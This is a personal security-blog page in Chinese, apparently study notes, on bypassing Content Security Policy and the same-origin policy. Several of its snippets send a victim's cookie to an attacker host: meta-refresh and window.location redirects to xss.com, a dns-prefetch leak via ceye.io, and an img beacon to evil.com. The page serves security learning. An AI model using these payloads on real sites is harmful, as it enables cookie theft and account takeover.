@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        域安全 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">域安全</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E9%80%9A%E7%94%A8/" class="post-tag">#通用</a>
+  
+
+
+          <span class="post-date">2023-04-20</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="toc-text">绕过CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-URL%E8%B7%B3%E8%BD%AC"><span class="toc-text">1.&#x3D;&#x3D;URL跳转&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-link%E6%A0%87%E7%AD%BE%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="toc-text">2.&#x3D;&#x3D;link标签预加载&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8"><span class="toc-text">3.&#x3D;&#x3D;利用浏览器补全&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8"><span class="toc-text">4.代码重用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-ifrmae"><span class="toc-text">5.&#x3D;&#x3D;ifrmae&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-meta%E6%A0%87%E7%AD%BE"><span class="toc-text">6.meta标签</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87SOP"><span class="toc-text">绕过SOP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8img"><span class="toc-text">利用img</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9URI%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-text">对URI的解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4SOP%E7%BB%95%E8%BF%87"><span class="toc-text">设计缺陷导致SOP绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">访问本地文件的同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E7%AB%8B%E7%8B%AC%E8%A1%8C%E7%9A%84Internet-Explorer"><span class="toc-text">特立独行的Internet Explorer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8F%98%E6%9B%B4%E8%87%AA%E8%BA%AB%E7%9A%84%E6%BA%90%E7%BB%95%E8%BF%87%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">通过变更自身的源绕过同源策略</span></a></li></ol></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h1><h2 id="1-URL跳转"><a href="#1-URL跳转" class="headerlink" title="1.==URL跳转=="></a>1.==URL跳转==</h2><p>在<code>default-src</code> ‘none’的情况下，可以使用meta标签实现跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在允许<code>unsafe-inline</code>的情况下，可以用<code>window.location</code>，或者<code>window.open</code>之类的方法进行跳转绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.location=<span class="string">&quot;http://www.xss.com/x.php?c=[cookie]&quot;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="2-link标签预加载"><a href="#2-link标签预加载" class="headerlink" title="2.==link标签预加载=="></a><strong>2.==link标签预加载==</strong></h2><p>在Firefox下，可以将cookie作为子域名，用<code>dns预解析</code>的方式把cookie带出去，查看<code>dns</code>服务器的日志就能得到cookie</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//[cookie].xxx.ceye.io&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="3-利用浏览器补全"><a href="#3-利用浏览器补全" class="headerlink" title="3.==利用浏览器补全=="></a><strong>3.==利用浏览器补全==</strong></h2><p>有些网站限制只有某些脚本才能使用，往往会使用script标签的nonce属性，只有nonce一致的脚本才生效</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;none&#x27;;script-src &#x27;nonce-abc&#x27;</span><br><span class="line"></span><br><span class="line">//CSP设置nonce为abc属性的标签</span><br></pre></td></tr></table></figure>
+
+<p>那么当脚本插入点为如下的情况时</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;aa&quot;</span> <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&#x27;CSP&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以插入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//14.rs</span> <span class="attr">a</span>=<span class="string">&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这样会拼成一个新的script标签，其中的<code>src</code>可以自由设定</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//14.rs</span> <span class="attr">a</span>=<span class="string">&quot;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script id=&quot;</span><span class="attr">aa</span>&quot; <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&#x27;CSP&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="4-代码重用"><a href="#4-代码重用" class="headerlink" title="4.代码重用"></a><strong>4.代码重用</strong></h2><p>假设页面中使用了<code>Jquery-mobile</code>库，并且<code>CSP</code>策略中包含”<code>script-src</code> ‘<code>unsafe-eval</code>‘ “或者”<code>script-src</code> ‘strict-dynamic’”</p>
+<p>那么下面的向量就可以绕过<code>CSP</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="5-ifrmae"><a href="#5-ifrmae" class="headerlink" title="5.==ifrmae=="></a><strong>5.==ifrmae==</strong></h2><p>(1) 如果页面A中有<code>CSP</code>限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过<code>CSP</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;B&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 在Chrome下，<code>iframe</code>标签支持<code>csp</code>属性，这有时候可以用来绕过一些防御，</p>
+<p>例如”<a target="_blank" rel="noopener" href="http://xxx&quot;页面有个`js`库会过滤`xss`向量,我们就可以使用`csp`属性来禁掉这个`js`库/">http://xxx&quot;页面有个`js`库会过滤`XSS`向量，我们就可以使用`csp`属性来禁掉这个`js`库</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">csp</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="6-meta标签"><a href="#6-meta标签" class="headerlink" title="6.meta标签"></a><strong>6.<code>meta</code>标签</strong></h2><p>meta标签有一些不常用的功能有时候有奇效： meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过<code>CSP nonce</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;cache-control&quot;</span> <span class="attr">content</span>=<span class="string">&quot;public&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>meta可以设置Cookie（Firefox下），可以结合self-xss利用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Set-Cookie&quot;</span> <span class="attr">Content</span>=<span class="string">&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="绕过SOP"><a href="#绕过SOP" class="headerlink" title="绕过SOP"></a>绕过SOP</h1><h2 id="利用img"><a href="#利用img" class="headerlink" title="利用img"></a>利用img</h2><p>同源策略并不限制<img>这样的标签从别的网站（跨域）去下载图片，可以利用Img偷cookie</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img=docuemnt.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src=<span class="string">&quot;htttp://evil.com/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+
+<p>我们把它封装成evil.js,就可以这么注入：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;http://evil.com/evil.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="对URI的解析"><a href="#对URI的解析" class="headerlink" title="对URI的解析"></a>对URI的解析</h2><p>IP是URI的重要组成部分，IP不止有一种格式。下面的标注形式其实都代表了同一个IP：216.58.209.68，大家可以在浏览器里实验。</p>
+<ul>
+<li>216.58.53572</li>
+<li>0xD8.072.53572</li>
+<li>3627733316</li>
+<li>0330.3854660</li>
+</ul>
+<p>当某些浏览器对URI的解释存在漏洞的时候，就可以构造出有趣的攻击链来绕过SOP。 比如CVE-2015-7188火狐浏览器SOP绕过中。攻击者构造了特殊的URL，并在攻击者自己控制的来自37.187.18.85的网页中发起跨域请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://37.187.18.85\0B\uFF20translate.google.com/fx_sop_bypass/FlashTest.swf?url=http://translate.google.com/manager/website/  </span><br></pre></td></tr></table></figure>
+
+<p>先通过\0B让Firefox认为这个请求是请求37.187.18.85本身的内容，再通过类似@字符的Unicode字符＠(\uFF20)让浏览器认为@之前的字符都是translate.google.com的账号和密码，从而返回translate.google.com的网页内容，实现绕过SOP。</p>
+<h2 id="设计缺陷导致SOP绕过"><a href="#设计缺陷导致SOP绕过" class="headerlink" title="设计缺陷导致SOP绕过"></a>设计缺陷导致SOP绕过</h2><p>在Java6，7中，如果两个域名解析到相同的IP，则会认为他们同源。假设我们有attacker.com和victim.com,两者都共享主机123.123.123.123。攻击者attacker.com可以在自己控制的域名下上传一个jar文件来访问victim.com的内容。</p>
+<h2 id="访问本地文件的同源策略"><a href="#访问本地文件的同源策略" class="headerlink" title="访问本地文件的同源策略"></a>访问本地文件的同源策略</h2><p>不同的浏览器使用不同的浏览器引擎，而不同的引擎对于同源策略的处理也并非完全一致。例如，Firefox使用Gecko浏览器引擎，在古老的Gecko1.8版（Firefox3）之前，任意两个file://的URI都被认为是同源的，意思就是，任意本地HTML文件将有权限访问本地计算机上任意其他文件。如今的Gecko版本中，一个HTML文档只能访问其所在文件夹下的其他文件。 对于跨越窗口的DOM访问，每个文件被当作一个单独的源，除了一种情况：当一个文件被另一个文件可以用同源策略访问时，视为相同的源。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件路径：/home/user/1.html --&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;frameset cols=&quot;50%,*&quot;&gt;  </span><br><span class="line">  &lt;frame src=&quot;/home/user/dir/2.html&quot;&gt;</span><br><span class="line">  &lt;frame src=&quot;...&quot;&gt;</span><br><span class="line">&lt;/frameset&gt;  </span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>上图中，1.html和2.html被视为相同的源。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件路径：/home/user/dir/1.html --&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;frameset cols=&quot;50%,*&quot;&gt;  </span><br><span class="line">  &lt;frame src=&quot;/home/user/2.html&quot;&gt;</span><br><span class="line">  &lt;frame src=&quot;...&quot;&gt;</span><br><span class="line">&lt;/frameset&gt;  </span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>上图中，1.html和2.html被视为异源。</p>
+<h2 id="特立独行的Internet-Explorer"><a href="#特立独行的Internet-Explorer" class="headerlink" title="特立独行的Internet Explorer"></a>特立独行的Internet Explorer</h2><p>在IE中，有两种情况同源策略<strong>无效</strong>：</p>
+<ul>
+<li>TrustZones（信任域）：当一个URI被加入到了IE的信任网站区域中时，浏览器会无视同源策略。</li>
+<li><strong>IE在考虑同源策略时不包括端口，</strong> 这意味着不同端口上的应用程序可以读取到比如用户的登陆账户密码/cookie等。</li>
+</ul>
+<h2 id="通过变更自身的源绕过同源策略"><a href="#通过变更自身的源绕过同源策略" class="headerlink" title="通过变更自身的源绕过同源策略"></a>通过变更自身的源绕过同源策略</h2><p>IE 6，7版中网页可以通过document.domain设置自身的来源为任意其他来源。如今网页仍然可以更改源，但是有一些限制。</p>
+<p>例如<code>http://malicious.eth.space/1.html</code>可以通过执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = &quot;eth.space&quot;;  </span><br></pre></td></tr></table></figure>
+
+<p>来绕过同源策略的限制，从而可以读取<code>http://eth.space/login.html</code>上的内容。这其中的应用大家可以自己去想。</p>
+<p>需要注意的是，在改变源时，端口号是需要特别指定的。由于运行以下js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = document.domain  </span><br></pre></td></tr></table></figure>
+
+<p>将会导致端口号被重置为null。所以源<code>http://eth.space:1337</code>不能通过修改<code>document.domain=&quot;eth.space&quot;</code>来访问<code>http://eth.space</code>的数据，除非后者也设置了<code>document.domain=&quot;eth.space&quot;</code>,这样双方的源端口号才能一致（<code>null</code>）。反之亦然。</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/04/22/7.29/netstat/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>docker基础</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/04/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%BA%E5%88%B6/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      浏览器机制
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
